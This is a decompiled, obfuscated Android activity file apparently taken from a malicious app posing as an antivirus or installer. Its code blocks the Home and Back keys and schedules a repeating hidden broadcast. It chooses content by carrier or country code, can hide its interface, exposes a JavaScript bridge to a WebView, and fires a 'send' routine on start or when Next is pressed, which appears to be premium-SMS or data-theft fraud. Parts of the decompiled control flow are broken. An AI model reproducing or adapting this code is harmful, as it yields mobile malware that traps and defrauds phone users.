package com.babblelink.viigee;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Dialog;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.TextView;
import antivirus.pro.MainReceiver;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONArray;
import org.json.JSONObject;
import roijf.sdfqlkj.sfakjdfa.bf;
import roijf.sdfqlkj.sfakjdfa.bh;
import roijf.sdfqlkj.sfakjdfa.br;
import roijf.sdfqlkj.sfakjdfa.by;

public class MainActivity
  extends Activity
{
  public static j a = null;
  public static WebView b;
  public static m c;
  public static int d = 2;
  static ProgressDialog e = null;
  public static Handler f = null;
  public static AtomicBoolean g = new AtomicBoolean(false);
  public static String h = "";
  public static String i = "";
  public static JSONObject j = null;
  public static String k = "";
  
  public MainActivity() {}
  
  public static void a(String paramString)
  {
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      b.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  static JSONObject e()
  {
    Object localObject = null;
    for (;;)
    {
      int m;
      JSONObject localJSONObject;
      try
      {
        JSONArray localJSONArray1 = new JSONArray(a.b);
        m = 0;
        if (m >= localJSONArray1.length())
        {
          if (localObject != null) {
            return localObject;
          }
        }
        else
        {
          localJSONObject = localJSONArray1.getJSONObject(m);
          JSONArray localJSONArray2 = localJSONObject.getJSONArray("codes");
          int n = 0;
          if (n >= localJSONArray2.length())
          {
            if ((!localJSONObject.has("default")) || (!localJSONObject.getBoolean("default")) || (localObject != null)) {
              break label126;
            }
            localObject = localJSONObject;
            break label132;
          }
          boolean bool = a.a.startsWith(localJSONArray2.getString(n));
          if (bool) {
            break label129;
          }
          n += 1;
          continue;
        }
        return new JSONObject();
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
      label126:
      break label132;
      label129:
      return localJSONObject;
      label132:
      m += 1;
    }
  }
  
  public void a()
  {
    bh.c(this, getPackageName());
  }
  
  void b()
  {
    for (;;)
    {
      try
      {
        JSONObject localJSONObject = j.a(j, "hide");
        if ((localJSONObject != null) && (!localJSONObject.getBoolean("enable"))) {
          return;
        }
        setContentView(2130903042);
        ((TextView)findViewById(2131230720)).setText(localJSONObject.getString("text"));
        if (localJSONObject.getInt("mode") == 0)
        {
          ((Button)findViewById(2131230734)).setVisibility(4);
          f.postDelayed(new h(this), localJSONObject.getInt("time") * 1000);
          return;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
      if (localException.getInt("mode") == 1) {
        ((Button)findViewById(2131230734)).setOnClickListener(new g(this));
      }
    }
  }
  
  public void c()
  {
    by.k("MainActivity::send()");
    if (!g.get())
    {
      g.set(true);
      bh.d(this);
      j.a(j, this);
    }
  }
  
  public void d()
  {
    try
    {
      if (e != null)
      {
        e.dismiss();
        e = null;
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void onClickNext(View paramView)
  {
    by.k("MainActivity::onClickNext()");
    new by(this).h("next: press");
    new by(this).e(true);
    c();
    try
    {
      bh.b(this, k);
      return;
    }
    catch (Exception paramView) {}
  }
  
  public void onClickText(View paramView)
  {
    b.loadUrl(i);
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    paramBundle = new Intent(this, MainReceiver.class);
    paramBundle.setAction(MainReceiver.a);
    paramBundle = PendingIntent.getBroadcast(this, 0, paramBundle, 0);
    ((AlarmManager)getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + antivirus.pro.d.a * 10, antivirus.pro.d.b * 20, paramBundle);
    if (f == null) {
      f = new Handler();
    }
    for (;;)
    {
      try
      {
        showDialog(d);
        paramBundle = new j();
        if (!paramBundle.a(this)) {
          paramBundle.b(this);
        }
        if (j.c)
        {
          a();
          return;
        }
        if (j == null)
        {
          by.k("MainActivity::onCreate()");
          j = new JSONObject(a.c);
          new bf(this);
          paramBundle = e();
          h = paramBundle.getString("html");
          if (!paramBundle.getBoolean("sendAfterStart")) {
            continue;
          }
          c();
          k = j.getString("dataUrl");
        }
      }
      catch (Exception paramBundle)
      {
        String str;
        paramBundle.printStackTrace();
        continue;
        b.loadUrl(str);
        continue;
      }
      c = new m(this, this);
      b = new WebView(this);
      paramBundle = new e(this);
      b.setWebViewClient(paramBundle);
      b.setScrollBarStyle(33554432);
      b.getSettings().setJavaScriptEnabled(true);
      b.setWebChromeClient(new f(this));
      b.addJavascriptInterface(c, "webapi");
      setContentView(b);
      paramBundle = "file:///android_asset/html/" + h;
      new StringBuilder(String.valueOf(paramBundle)).append("/index.html").toString();
      str = j.a(this, "weblink");
      if (str.length() != 0) {
        continue;
      }
      b.loadUrl(paramBundle + "/index.html");
      i = paramBundle + "/license.html";
      b();
      bh.a(this, br.p, 0L, false);
      bh.a(this, br.q, 5000L, true);
      return;
      f.postDelayed(new d(this), 60000L);
    }
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == d)
    {
      d();
      e = new ProgressDialog(this);
      e.setProgressStyle(0);
      e.setTitle("");
      e.setMessage("Loading...");
      e.setCancelable(false);
      return e;
    }
    return null;
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    super.onCreateOptionsMenu(paramMenu);
    paramMenu.add(0, 9000001, 0, getString(2131165185));
    return true;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 3) {}
    while (paramInt == 4) {
      return true;
    }
    return false;
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    switch (paramMenuItem.getItemId())
    {
    default: 
      return super.onOptionsItemSelected(paramMenuItem);
    }
    b.loadUrl(i);
    return true;
  }
  
  public void onStop()
  {
    super.onStop();
  }
}
